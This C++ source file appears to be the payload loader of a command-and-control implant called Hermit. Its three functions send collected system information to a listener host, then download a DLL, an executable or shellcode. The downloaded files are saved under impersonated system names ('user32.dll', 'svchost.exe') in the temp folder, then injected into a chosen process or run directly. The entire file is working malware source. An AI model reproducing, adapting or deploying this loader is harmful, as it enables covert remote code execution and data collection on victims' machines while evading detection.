#include "hermit.hpp"

namespace Hermit
{
    BOOL LoadDLL()
    {
        HINTERNET hSession = NULL;
        HINTERNET hConnect = NULL;
        HINTERNET hRequest = NULL;
        BOOL bResults = FALSE;

        // Get system information as json.
        std::wstring wInfoJson = Handler::GetInitialInfo();
        std::string sInfoJson = Utils::Convert::UTF8Encode(wInfoJson);

        System::Http::WinHttpHandlers handlers = System::Http::InitRequest(
            LISTENER_HOST_W,
            LISTENER_PORT
        );
        if (!handlers.hSession || !handlers.hConnect) {
            System::Http::WinHttpCloseHandles(hSession, hConnect, NULL);
            return FALSE;
        }

        hSession = handlers.hSession;
        hConnect = handlers.hConnect;

        // Download a DLL file
        System::Http::WinHttpResponse resp = System::Http::SendRequest(
            hConnect,
            LISTENER_HOST_W,
            LISTENER_PORT,
            REQUEST_PATH_DOWNLOAD_W,
            L"POST",
            L"Content-Type: application/json\r\n",
            (LPVOID)sInfoJson.c_str(),
            (DWORD)strlen(sInfoJson.c_str())
        );
        if (!resp.bResult || resp.dwStatusCode != 200)
        {
            System::Http::WinHttpCloseHandles(hSession, hConnect, NULL);
            return FALSE;
        }

        hRequest = resp.hRequest;

        // Set the temp file path
        std::wstring dllFileName = L"user32.dll"; // Impersonate the file name.
        std::wstring dllPath = System::Env::GetStrings(L"%TEMP%") + L"\\" + dllFileName;
        size_t dwDllPathSize = (dllPath.size() + 1) * sizeof(wchar_t);

        // Download a DLL file
        bResults = System::Http::WriteResponseData(hRequest, dllPath);
        if (!bResults)
        {
            System::Http::WinHttpCloseHandles(hSession, hConnect, hRequest);
            return FALSE;
        }
        System::Http::WinHttpCloseHandles(hSession, hConnect, hRequest);

        // Get target PID to inject DLL
        DWORD dwPid = System::Process::GetProcessIdByName(TEXT(PAYLOAD_PROCESS));

        // Inject DLL
        if (strcmp(PAYLOAD_TECHNIQUE, "dll-injection") == 0)
        {
            bResults = Technique::Injection::DllInjection(dwPid, (LPVOID)dllPath.c_str(), dwDllPathSize);
        }
        else
        {
            return FALSE;
        }

        if (!bResults)
        {
            return FALSE;
        }

        return TRUE;
    }

    BOOL LoadExecutable()
    {
        HINTERNET hSession = NULL;
        HINTERNET hConnect = NULL;
        HINTERNET hRequest = NULL;
        BOOL bResults = FALSE;

        // Get system information as json.
        std::wstring wInfoJson = Handler::GetInitialInfo();
        std::string sInfoJson = Utils::Convert::UTF8Encode(wInfoJson);

        System::Http::WinHttpHandlers handlers = System::Http::InitRequest(
            LISTENER_HOST_W,
            LISTENER_PORT
        );
        if (!handlers.hSession || !handlers.hConnect) {
            System::Http::WinHttpCloseHandles(hSession, hConnect, NULL);
            return FALSE;
        }

        hSession = handlers.hSession;
        hConnect = handlers.hConnect;

        // Download an executable
        System::Http::WinHttpResponse resp = System::Http::SendRequest(
            hConnect,
            LISTENER_HOST_W,
            LISTENER_PORT,
            REQUEST_PATH_DOWNLOAD_W,
            L"POST",
            L"Content-Type: application/json\r\n",
            (LPVOID)sInfoJson.c_str(),
            (DWORD)strlen(sInfoJson.c_str())
        );
        if (!resp.bResult || resp.dwStatusCode != 200)
        {
            System::Http::WinHttpCloseHandles(hSession, hConnect, NULL);
            return FALSE;
        }

        hRequest = resp.hRequest;

        // Set the temp file path
        std::wstring execFileName = L"svchost.exe"; // Impersonate the file name.
        std::wstring execPath = System::Env::GetStrings(L"%TEMP%") + L"\\" + execFileName;
        
        // Download an executable
        if (!System::Http::WriteResponseData(hRequest, execPath))
        {
            System::Http::WinHttpCloseHandles(hSession, hConnect, hRequest);
            return FALSE;
        }
        System::Http::WinHttpCloseHandles(hSession, hConnect, hRequest);

        // Execute
        if (strcmp(PAYLOAD_TECHNIQUE, "direct-execution") == 0)
        {
            bResults = System::Process::ExecuteFile(execPath);
        }
        else
        {
            return FALSE;
        }

        if (!bResults)
        {
            return FALSE;
        }

        return TRUE;
    }

    BOOL LoadShellcode()
    {
        HINTERNET hSession = NULL;
        HINTERNET hConnect = NULL;
        HINTERNET hRequest = NULL;
        BOOL bResults = FALSE;

        // Get system information as json.
        std::wstring wInfoJson = Handler::GetInitialInfo();
        std::string sInfoJson = Utils::Convert::UTF8Encode(wInfoJson);

        System::Http::WinHttpHandlers handlers = System::Http::InitRequest(
            LISTENER_HOST_W,
            LISTENER_PORT
        );
        if (!handlers.hSession || !handlers.hConnect) {
            System::Http::WinHttpCloseHandles(hSession, hConnect, NULL);
            return FALSE;
        }

        hSession = handlers.hSession;
        hConnect = handlers.hConnect;

        // Download shellcode
        System::Http::WinHttpResponse resp = System::Http::SendRequest(
            hConnect,
            LISTENER_HOST_W,
            LISTENER_PORT,
            REQUEST_PATH_DOWNLOAD_W,
            L"POST",
            L"Content-Type: application/json\r\n",
            (LPVOID)sInfoJson.c_str(),
            (DWORD)strlen(sInfoJson.c_str())
        );
        if (!resp.bResult || resp.dwStatusCode != 200)
        {
            System::Http::WinHttpCloseHandles(hSession, hConnect, NULL);
            return FALSE;
        }

        hRequest = resp.hRequest;

        std::vector<BYTE> respBytes = System::Http::ReadResponseBytes(hRequest);
        if (respBytes.size() == 0)
        {
            return FALSE;
        }

        // Get target PID to inject DLL
        DWORD dwPid = System::Process::GetProcessIdByName(TEXT(PAYLOAD_PROCESS));

        // Inject shellcode
        if (strcmp(PAYLOAD_TECHNIQUE, "shellcode-injection") == 0)
        {
            bResults = Technique::Injection::ShellcodeInjection(dwPid, respBytes);

        }
        else
        {
            return FALSE;
        }

        if (!bResults)
        {
            System::Http::WinHttpCloseHandles(hSession, hConnect, hRequest);
            return FALSE;
        }

        System::Http::WinHttpCloseHandles(hSession, hConnect, hRequest);

        return TRUE;
    }
}
